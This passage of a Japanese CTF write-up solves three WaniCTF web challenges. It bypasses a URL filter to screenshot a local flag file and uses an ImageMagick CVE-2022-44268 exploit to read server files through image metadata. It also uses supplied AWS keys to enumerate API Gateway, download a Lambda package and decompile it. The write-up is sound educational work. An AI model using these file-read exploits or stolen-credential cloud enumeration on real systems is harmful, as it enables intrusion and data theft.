+<img src=/images/posts/35/screenshot.png alt=screenshot></p><p><code>index.js</code>は以下です。</p><pre tabindex=0><code class=language-:js data-lang=:js>const playwright = require(&#34;playwright&#34;);
+const express = require(&#34;express&#34;);
+const morgan = require(&#34;morgan&#34;);
+
+const main = async function () {
+  const browser = await playwright.chromium.launch();
+
+  const app = express();
+
+  // Logging
+  app.use(morgan(&#34;short&#34;));
+
+  app.use(express.static(&#34;static&#34;));
+
+  app.get(&#34;/api/screenshot&#34;, async function (req, res) {
+    const context = await browser.newContext();
+    context.setDefaultTimeout(5000);
+
+    try {
+      if (!req.query.url.includes(&#34;http&#34;) || req.query.url.includes(&#34;file&#34;)) {
+        res.status(400).send(&#34;Bad Request&#34;);
+        return;
+      }
+
+      const page = await context.newPage();
+
+      const params = new URLSearchParams(req.url.slice(req.url.indexOf(&#34;?&#34;)));
+      await page.goto(params.get(&#34;url&#34;));
+
+      const buf = await page.screenshot();
+
+      res.header(&#34;Content-Type&#34;, &#34;image/png&#34;).send(buf);
+    } catch (err) {
+      console.log(&#34;[Error]&#34;, req.method, req.url, err);
+      res.status(500).send(&#34;Internal Error&#34;);
+    } finally {
+      await context.close();
+    }
+  });
+
+  app.listen(80, () =&gt; {
+    console.log(&#34;Listening on port 80&#34;);
+  });
+};
+
+main();
+</code></pre><p><code>flag.txt</code>は<code>/app</code>ディレクトリに存在します。</p><pre tabindex=0><code>COPY . /app
+COPY ./flag.txt /flag.txt
+</code></pre><p>以下の条件式をバイパスして<code>file:///app/flag.txt</code>をURLとして指定することができれば良いです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#34;http&#34;</span>) <span style=color:#f92672>||</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#34;file&#34;</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Bad Request&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><code>File:///app/flag.txt?http</code>などで<code>flag.txt</code>のスクリーンショットを撮ることができます。
+<img src=/images/posts/35/screenshot_flag.png alt=screenshot_flag></p><pre tabindex=0><code>FLAG{beware_of_parameter_type_confusion!}
+</code></pre><h1 id=web-certified1>[web] certified1</h1><blockquote><p>最近流行りの言語を使った安全なウェブアプリが完成しました！</p><p>We have released a secure web application using a state-of-the-art language!</p><p><a href=https://certified-web.wanictf.org>https://certified-web.wanictf.org</a></p><p>この問題にはフラグが2つ存在します。ファイル/flag_Aにあるフラグをcertified1に、環境変数FLAG_Bにあるフラグをcertified2に提出してください。</p><p>There are two flags in this problem. Please submit the flag in file /flag_A to certified1 and one in the environment variable FLAG_B to certified2.</p><p>Note: &ldquo;承認, ワニ博士&rdquo; means &ldquo;Approved, Dr. Wani&rdquo; in Japanese.</p></blockquote><p>画像をアップロードするとワニ博士の承認スタンプを押してくれるアプリケーションです。実用的ですね。
+<img src=/images/posts/35/certified1.png alt=certified1>
+<img src=/images/posts/35/certified1_hanko.png alt=certified1_hanko></p><p>以下、画像を処理する<code>process_image.rs</code>です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.rs data-lang=:.rs><span style=display:flex><span><span style=color:#66d9ef>use</span> anyhow::{bail, Context, Result};
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> std::path::Path;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> std::process::Stdio;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> tokio::fs;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> tokio::process::Command;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>pub</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>fn</span> <span style=color:#a6e22e>process_image</span>(working_directory: <span style=color:#66d9ef>&amp;</span><span style=color:#a6e22e>Path</span>, input_filename: <span style=color:#66d9ef>&amp;</span><span style=color:#a6e22e>Path</span>) -&gt; Result<span style=color:#f92672>&lt;</span>()<span style=color:#f92672>&gt;</span> {
+</span></span><span style=display:flex><span>    println!(<span style=color:#e6db74>&#34;{}&#34;</span>, working_directory.join(input_filename).display());
+</span></span><span style=display:flex><span>    fs::copy(
+</span></span><span style=display:flex><span>        working_directory.join(input_filename),
+</span></span><span style=display:flex><span>        working_directory.join(<span style=color:#e6db74>&#34;input&#34;</span>),
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>    .context(<span style=color:#e6db74>&#34;Failed to prepare input&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    fs::write(
+</span></span><span style=display:flex><span>        working_directory.join(<span style=color:#e6db74>&#34;overlay.png&#34;</span>),
+</span></span><span style=display:flex><span>        include_bytes!(<span style=color:#e6db74>&#34;../assets/hanko.png&#34;</span>),
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>    .context(<span style=color:#e6db74>&#34;Failed to prepare overlay&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> child <span style=color:#f92672>=</span> Command::new(<span style=color:#e6db74>&#34;sh&#34;</span>)
+</span></span><span style=display:flex><span>        .args([
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;-c&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;timeout --signal=KILL 5s magick ./input -resize 640x480 -compose over -gravity southeast ./overlay.png -composite ./output.png&#34;</span>,
+</span></span><span style=display:flex><span>        ])
+</span></span><span style=display:flex><span>        .current_dir(working_directory)
+</span></span><span style=display:flex><span>        .stdin(Stdio::null())
+</span></span><span style=display:flex><span>        .stdout(Stdio::null())
+</span></span><span style=display:flex><span>        .stderr(Stdio::piped())
+</span></span><span style=display:flex><span>        .spawn()
+</span></span><span style=display:flex><span>        .context(<span style=color:#e6db74>&#34;Failed to spawn&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> out <span style=color:#f92672>=</span> child
+</span></span><span style=display:flex><span>        .wait_with_output()
+</span></span><span style=display:flex><span>        .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>        .context(<span style=color:#e6db74>&#34;Failed to read output&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>!</span>out.status.success() {
+</span></span><span style=display:flex><span>        bail<span style=color:#f92672>!</span>(
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;image processing failed on {}:\n{}&#34;</span>,
+</span></span><span style=display:flex><span>            working_directory.display(),
+</span></span><span style=display:flex><span>            std::<span style=color:#66d9ef>str</span>::from_utf8(<span style=color:#f92672>&amp;</span>out.stderr)<span style=color:#f92672>?</span>
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Ok(())
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>以下の部分で、ImageMagickを用いて入力の画像に、ハンコの画像を重ねる処理を行います。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.rs data-lang=:.rs><span style=display:flex><span><span style=color:#66d9ef>let</span> child <span style=color:#f92672>=</span> Command::new(<span style=color:#e6db74>&#34;sh&#34;</span>)
+</span></span><span style=display:flex><span>    .args([
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;-c&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;timeout --signal=KILL 5s magick ./input -resize 640x480 -compose over -gravity southeast ./overlay.png -composite ./output.png&#34;</span>,
+</span></span><span style=display:flex><span>    ])
+</span></span></code></pre></div><p>Dockerfileをみると、ImageMagickのバージョン<code>7.1.0-51</code>が使用されていることがわかります。</p><pre tabindex=0><code>ARG MAGICK_URL=&#34;https://github.com/ImageMagick/ImageMagick/releases/download/7.1.0-51/ImageMagick--gcc-x86_64.AppImage&#34;
+RUN curl --location --fail -o /usr/local/bin/magick $MAGICK_URL &amp;&amp; \
+    chmod 755 /usr/local/bin/magick
+</code></pre><p>調べると、<a href=https://nvd.nist.gov/vuln/detail/CVE-2022-44268>CVE-2022-44268</a>の脆弱性が見つかりました。画像のメタデータを介して、任意のファイルが読める脆弱性のようです。</p><p>ここではバージョン<code>7.1.0-49</code>にこの脆弱性が存在することが示されていますが、バージョン<code>7.1.0-51</code>も脆弱であるか確かめるためにexploitを実行します。こちらの<a href=https://github.com/kljunowsky/CVE-2022-44268>exploitコード</a>を使用します。</p><p>certified1のflagは<code>/flag_A</code>に書かれています。</p><pre tabindex=0><code>RUN echo &#39;FAKE{REDACTED}&#39; &gt; /flag_A
+ENV FLAG_B=&#34;FAKE{REDACTED}&#34;
+</code></pre><p>画像のメタデータを介して<code>/flag_A</code>を読み込むことができました。</p><pre tabindex=0><code>$ python3 CVE-2022-44268.py --image network_dennou_sekai_man.png --file-to-read /flag_A --output poisoned.png
+
+# poisoned.pngをアップロード
+
+$ python3 CVE-2022-44268.py --url https://certified-web.wanictf.org/view/a51f7447-60d6-4eb7-9508-aad37c1318bf
+FLAG{7he_sec0nd_f1a9_1s_w41t1n9_f0r_y0u!}
+</code></pre><pre tabindex=0><code>FLAG{7he_sec0nd_f1a9_1s_w41t1n9_f0r_y0u!}
+</code></pre><h1 id=web-lambda>[web] Lambda</h1><blockquote><p>以下のサイトはユーザ名とパスワードが正しいときフラグを返します。今あなたはこのサイトの管理者のAWSアカウントのログイン情報を極秘に入手しました。このログインを突破できますか。</p><p>The following site returns a flag when you input correct username and password. Now you have the confidential login information for the AWS account of the administrator of this site. Please get through this authentication.</p><p><a href=https://lambda-web.wanictf.org>https://lambda-web.wanictf.org</a></p></blockquote><p>まず、提供されるwebサイトのソースをみると、usernameとpasswordをAPI Gatewayを用いて立てられているAPIに送信していることがわかります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span>window.<span style=color:#a6e22e>onload</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>event</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>btn</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;#submitBtn&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>btn</span>.<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;click&#34;</span>, <span style=color:#66d9ef>async</span> () =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;aaa&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;.password&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;.username&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;.result&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>password</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>username</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>URL</span>(
+</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;https://k0gh2dp2jg.execute-api.ap-northeast-1.amazonaws.com/test/&#34;</span>
+</span></span><span style=display:flex><span>    );
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>searchParams</span>.<span style=color:#a6e22e>append</span>(<span style=color:#e6db74>&#34;PassWord&#34;</span>, <span style=color:#a6e22e>password</span>.<span style=color:#a6e22e>value</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>searchParams</span>.<span style=color:#a6e22e>append</span>(<span style=color:#e6db74>&#34;UserName&#34;</span>, <span style=color:#a6e22e>username</span>.<span style=color:#a6e22e>value</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>response</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>href</span>, { <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;get&#34;</span> });
+</span></span><span style=display:flex><span>    Promise.<span style=color:#a6e22e>resolve</span>(<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>text</span>()).<span style=color:#a6e22e>then</span>(
+</span></span><span style=display:flex><span>      (<span style=color:#a6e22e>value</span>) =&gt; {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>value</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>result</span>.<span style=color:#a6e22e>innerText</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>value</span>;
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      (<span style=color:#a6e22e>value</span>) =&gt; {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#a6e22e>value</span>);
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    );
+</span></span><span style=display:flex><span>  });
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>AWSのアクセスキーとシークレットアクセスキーが提供されます。ここでは念のため、キーは伏せ字にしています。</p><pre tabindex=0><code class=language-:.csv data-lang=:.csv>Access key ID,Secret access key,Region
+*********,*********,ap-northeast-1
+</code></pre><p>提供されたクレデンシャルを用いてAWSのAPIを叩いていきます。まずはアクセスキーとシークレットアクセスキー、リージョンを設定します。</p><pre tabindex=0><code>$ aws configure
+AWS Access Key ID [None]: *********
+AWS Secret Access Key [None]: *********
+Default region name [ap-northeast-1]: ap-northeast-1
+Default output format [text]: json
+</code></pre><p>API Gatewayの一覧を取得します。<code>WaniCTFLambdaGateway</code>というAPI Gatewayが見つかります。</p><pre tabindex=0><code>$ aws apigateway get-rest-apis --region ap-northeast-1
+{
+    &#34;items&#34;: [
+        {
+            &#34;id&#34;: &#34;k0gh2dp2jg&#34;,
+            &#34;name&#34;: &#34;WaniCTFLambdaGateway&#34;,
+            &#34;createdDate&#34;: &#34;2023-04-23T10:05:08+09:00&#34;,
+            &#34;apiKeySource&#34;: &#34;HEADER&#34;,
+            &#34;endpointConfiguration&#34;: {
+                &#34;types&#34;: [
+                    &#34;REGIONAL&#34;
+                ]
+            },
+            &#34;disableExecuteApiEndpoint&#34;: false
+        }
+    ]
+}
+</code></pre><p><code>WaniCTFLambdaGateway</code>のリソースを取得します。GETメソッドが見つかります。</p><pre tabindex=0><code>$ aws apigateway get-resources --rest-api-id k0gh2dp2jg 
+{
+    &#34;items&#34;: [
+        {
+            &#34;id&#34;: &#34;hd6co6xcng&#34;,
+            &#34;path&#34;: &#34;/&#34;,
+            &#34;resourceMethods&#34;: {
+                &#34;GET&#34;: {}
+            }
+        }
+    ]
+}
+</code></pre><p>GETメソッドの定義を確認します。<code>wani_function</code>というlambdaを使用していることがわかります。</p><pre tabindex=0><code>$ aws apigateway get-method --rest-api-id k0gh2dp2jg --resource-id hd6co6xcng --http-method GET
+{
+    &#34;httpMethod&#34;: &#34;GET&#34;,
+    &#34;authorizationType&#34;: &#34;NONE&#34;,
+    &#34;apiKeyRequired&#34;: false,
+    &#34;requestParameters&#34;: {},
+    &#34;methodResponses&#34;: {
+        &#34;200&#34;: {
+            &#34;statusCode&#34;: &#34;200&#34;,
+            &#34;responseModels&#34;: {
+                &#34;application/json&#34;: &#34;Empty&#34;
+            }
+        }
+    },
+    &#34;methodIntegration&#34;: {
+        &#34;type&#34;: &#34;AWS_PROXY&#34;,
+        &#34;httpMethod&#34;: &#34;POST&#34;,
+        &#34;uri&#34;: &#34;arn:aws:apigateway:ap-northeast-1:lambda:path/2015-03-31/functions/arn:aws:lambda:ap-northeast-1:839
+865256996:function:wani_function/invocations&#34;,
+        &#34;passthroughBehavior&#34;: &#34;WHEN_NO_MATCH&#34;,
+        &#34;contentHandling&#34;: &#34;CONVERT_TO_TEXT&#34;,
+        &#34;timeoutInMillis&#34;: 29000,
+        &#34;cacheNamespace&#34;: &#34;hd6co6xcng&#34;,
+        &#34;cacheKeyParameters&#34;: [],
+        &#34;integrationResponses&#34;: {
+            &#34;200&#34;: {
+                &#34;statusCode&#34;: &#34;200&#34;,
+                &#34;responseTemplates&#34;: {}
+            }
+        }
+    }
+}
+</code></pre><p><code>wani_function</code>の情報を取得します。</p><pre tabindex=0><code>$ aws lambda get-function --function-name wani_function            
+{
+    &#34;Configuration&#34;: {
+        &#34;FunctionName&#34;: &#34;wani_function&#34;,
+        &#34;FunctionArn&#34;: &#34;arn:aws:lambda:ap-northeast-1:839865256996:function:wani_function&#34;,
+        &#34;Runtime&#34;: &#34;dotnet6&#34;,
+        &#34;Role&#34;: &#34;arn:aws:iam::839865256996:role/service-role/wani_function-role-zhw0ck9t&#34;,
+        &#34;Handler&#34;: &#34;WaniCTF_Lambda::WaniCTF_Lambda.Function::LoginWani&#34;,
+        &#34;CodeSize&#34;: 960588,
+        &#34;Description&#34;: &#34;&#34;,
+        &#34;Timeout&#34;: 15,
+        &#34;MemorySize&#34;: 512,
+        &#34;LastModified&#34;: &#34;2023-05-01T14:21:15.000+0000&#34;,
+        &#34;CodeSha256&#34;: &#34;Gfkg4Q7OrMA+DPsFg6zR+gZXezeG8KEMe/8w8BLmRSA=&#34;,
+        &#34;Version&#34;: &#34;$LATEST&#34;,
+        &#34;TracingConfig&#34;: {
+            &#34;Mode&#34;: &#34;PassThrough&#34;
+        },
+        &#34;RevisionId&#34;: &#34;0a4cde2c-6dbb-4240-9332-2f5611256deb&#34;,
+        &#34;State&#34;: &#34;Active&#34;,
+        &#34;LastUpdateStatus&#34;: &#34;Successful&#34;,
+        &#34;PackageType&#34;: &#34;Zip&#34;,
+        &#34;Architectures&#34;: [
+            &#34;x86_64&#34;
+        ]
+    },
+    &#34;Code&#34;: {
+        &#34;RepositoryType&#34;: &#34;S3&#34;,
+        &#34;Location&#34;: &#34;https://awslambda-ap-ne-1-tasks.s3.ap-northeast-1.amazonaws.com/snapshots/839865256996/wani_fun
+ction-df5e5803-a6c5-4483-b58a-a296b73218a3?versionId=JWFcoHVwceWBtheBA6f9sJoChpeeeHF.&amp;X-Amz-Security-Token=IQoJb3JpZ
+2luX2VjEOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgfdEN8DoVIG5g3V%2By1MutC5DMJW4fdxdvxiemi5XOYfM
+CIDGUfmlFC8cgAJbPv9d4BEdQIVmwXl%2BWGvEBQPMpHm%2BGKsoFCPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMOTE5OTgwOTI1MTM5IgyiHWd
+BT9Arl4SftYoqngViAKDI25pWXXRjvpWHA%2FPskdQ6I7YkMsMa5XmvvW82v3GGFvJyO%2FhzEuDTRewtlnxnGITCVB4ESGllVdnwyjKwE5MxbcXsJjz
+skrDhbXUkMy7FBSF1kwAesU04az%2FLOUT5hToMuWS%2FEoE9t5iwCrnLoPYc8NUMmcMHYq6ykZOx00RIS2e%2Fj6aDwYAqt0%2Bh5pDMG2pxBdmV1JN
+NF3dAA5uIUFZAytgqEfBRYp4o%2BDOzcI0EDA8BOSC91V5IUFE7uM7ZLh6HItiyM44RiyMf7ndL6FsVd%2BSki9j1Gcq0PV0IHoOTrnwDOTgHxvW33EY
+lwGfNSMea2rvbhLvjTWunMxKn0ft%2BJsIKxzN5zI87JDzA%2BaHZbSR0HdoM9u59dl7rc2j%2FJUDv1r6Bt4yliuiqTVJdhg4fLz2O%2BeJjQvwB5SQ
+fxCCI1Nm5sc32JkP18p0Ch%2BYVDK%2BuDWfYy1jVIMtRgoCVw0VrFiHgKGi2FQDgO12SJcE4PagZPm0Ae8qCZ9ewoL%2B%2F6KtddMxiXK5w0aG1G9X
+LvsbMkFauwBwnqtU82t7if4M4noUkNRYMeYMWTAFz3K9wb5JIi8xtGTlWBrml72qA%2FphEL%2FC14QGnJUMeyAXqp1CCUEFpcdViFaUwhwYDjNIhzxv
+mTthcbpAGM056JVY0fThRHu1Blrs38S6dA%2FkiJCEcBgNEk9YFaLLaQrAxmhaGl%2Bx30yCX1QNhEGBxUSESOI9KzSF3ew1HdlGamKOh2jb2c9go%2F
+R%2FGIDYOAsXKXrg3lGvFPoB%2B%2Fbxsdth9qAXw5hXMYHoNlJTe741QntM0FKzeYxLbLRpkUAaUveP95E2RFJQ71fN6lARfEQmMaaAra2nPPEzXKJe
+HqCgM173B%2FFED8F0jQ%2FxbkqC%2BtavsMOKVz6IGOrIBLC8KUOTMjtrar8lP0YVkhXmTcK70p5euS1%2FfbWYchh4I29tknvilK4wrMSsNIuF9T8p
+6IzqoYI5NwmwNaVAfNVaG9fTFLZZ5IXTw6t3W7WAFgSUSn3WbQY%2B%2Bg5PhrjGt0fWwJrwGpDxC%2BVgsQHzjnkAgtRn1Hi612VAfkXzCkgVmYVgy%
+2FRGvHHOdBXBjZeCiAKbXBZqccCoB%2FrLQ6OrkLSgVZFlwBSJ24kMpnLSx1qnITA%3D%3D&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Date=
+20230504T160931Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=600&amp;X-Amz-Credential=ASIA5MMZC4DJ5YNVE2FU%2F20230504%2Fap-no
+rtheast-1%2Fs3%2Faws4_request&amp;X-Amz-Signature=4ea8dfc6e3f0fc5fc5d35d29baad784be079f84d74a90f563cec5fd2e1958563&#34;
+    }
+</code></pre><p>lambda関数のバイナリを取得します。</p><pre tabindex=0><code>$ url=$(aws lambda get-function --function-name wani_function | jq -r &#39;.Code.Location&#39;) 
+$ curl -o lambda.zip ${url}
+$ unzip lambda.zip
+</code></pre><p>zipファイルを展開するとこれらのファイルが得られます。</p><pre tabindex=0><code>Amazon.Lambda.APIGatewayEvents.dll
+Amazon.Lambda.Core.dll
+Amazon.Lambda.Serialization.Json.dll
+Amazon.Lambda.Serialization.SystemTextJson.dll
+Newtonsoft.Json.dll
+WaniCTF_Lambda.deps.json
+WaniCTF_Lambda.dll
+WaniCTF_Lambda.runtimeconfig.json
+</code></pre><p>.NETはよくわかりませんが、とりあえず.dllをデコンパイルしたいです。自分はMacを使用しているので、ILSPyのCLI版を利用してデコンパイルを行います。</p><p>まずは、<a href=https://dotnet.microsoft.com/ja-jp/download/dotnet/thank-you/sdk-6.0.408-macos-x64-installer>こちら</a>から.NETのSDKをダウンロードし、以下でILSPyのCLI版をインストールします。</p><pre tabindex=0><code>$ dotnet tool install --global ilspycmd
+</code></pre><p><code>WaniCTF_Lambda.dll</code>をデコンパイルするとflagが見つかります。</p><pre tabindex=0><code>$ ilspycmd WaniCTF_Lambda.dll                   
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.Versioning;
+using Amazon.Lambda.APIGatewayEvents;
+using Amazon.Lambda.Core;
+using Amazon.Lambda.Serialization.Json;
+using Microsoft.CodeAnalysis;
+
+[assembly: CompilationRelaxations(8)]
+[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
+[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
+[assembly: LambdaSerializer(typeof(JsonSerializer))]
+[assembly: TargetFramework(&#34;.NETCoreApp,Version=v6.0&#34;, FrameworkDisplayName = &#34;.NET 6.0&#34;)]
+[assembly: AssemblyCompany(&#34;WaniCTF_Lambda&#34;)]
+[assembly: AssemblyConfiguration(&#34;Release&#34;)]
+[assembly: AssemblyFileVersion(&#34;1.0.0.0&#34;)]
+[assembly: AssemblyInformationalVersion(&#34;1.0.0&#34;)]
+[assembly: AssemblyProduct(&#34;WaniCTF_Lambda&#34;)]
+[assembly: AssemblyTitle(&#34;WaniCTF_Lambda&#34;)]
+[assembly: AssemblyVersion(&#34;1.0.0.0&#34;)]
+namespace Microsoft.CodeAnalysis
+{
+        [CompilerGenerated]
+        [Embedded]
+        internal sealed class EmbeddedAttribute : Attribute
+        {
+        }
+}
+namespace System.Runtime.CompilerServices
+{
+        [CompilerGenerated]
+        [Microsoft.CodeAnalysis.Embedded]
+        [AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)]
+        internal sealed class NullableAttribute : Attribute
+        {
+                public readonly byte[] NullableFlags;
+
+                public NullableAttribute(byte P_0)
+                {
+                        NullableFlags = new byte[1] { P_0 };
+                }
+
+                public NullableAttribute(byte[] P_0)
+                {
+                        NullableFlags = P_0;
+                }
+        }
+        [CompilerGenerated]
+        [Microsoft.CodeAnalysis.Embedded]
+        [AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)]
+        internal sealed class NullableContextAttribute : Attribute
+        {
+                public readonly byte Flag;
+
+                public NullableContextAttribute(byte P_0)
+                {
+                        Flag = P_0;
+                }
+        }
+}
+namespace WaniCTF_Lambda
+{
+        public class Function
+        {
+                public APIGatewayProxyResponse LoginWani(APIGatewayProxyRequest input, ILambdaContext context)
+                {
+                        IDictionary&lt;string, string&gt; queryStringParameters = input.QueryStringParameters;
+                        Dictionary&lt;string, string&gt; headers = new Dictionary&lt;string, string&gt;
+                        {
+                                [&#34;Access-Control-Allow-Origin&#34;] = &#34;https://lambda-web.wanictf.org&#34;,
+                                [&#34;Access-Control-Allow-Methods&#34;] = &#34;GET OPTIONS&#34;
+                        };
+                        if (queryStringParameters == null)
+                        {
+                                return new APIGatewayProxyResponse
+                                {
+                                        StatusCode = 500,
+                                        Body = &#34;QueryStringParameters is null&#34;,
+                                        Headers = headers
+                                };
+                        }
+                        if (!queryStringParameters.ContainsKey(&#34;UserName&#34;) || !queryStringParameters.ContainsKey(&#34;PassWord&#34;))
+                        {
+                                return new APIGatewayProxyResponse
+                                {
+                                        StatusCode = 400,
+                                        Body = &#34;ユーザー名とパスワードを指定してください&#34;,
+                                        Headers = headers
+                                };
+                        }
+                        string text = queryStringParameters[&#34;UserName&#34;];
+                        string text2 = queryStringParameters[&#34;PassWord&#34;];
+                        if (text == &#34;LambdaWaniwani&#34; &amp;&amp; text2 == &#34;aflkajflalkalbnjlsrkaerl&#34;)
+                        {
+                                return new APIGatewayProxyResponse
+                                {
+                                        StatusCode = 200,
+                                        Body = &#34;FLAG{l4mabd4_1s_s3rverl3ss_s3rv1c3}&#34;,
+                                        Headers = headers
+                                };
+                        }
+                        return new APIGatewayProxyResponse
+                        {
+                                StatusCode = 200,
+                                Body = &#34;Password or UserName are incorrect!!! :  &#34; + text + &#34;: &#34; + text2,
+                                Headers = headers
+                        };
+                }
+        }
+}
+</code></pre><pre tabindex=0><code>FLAG{l4mabd4_1s_s3rverl3ss_s3rv1c3}
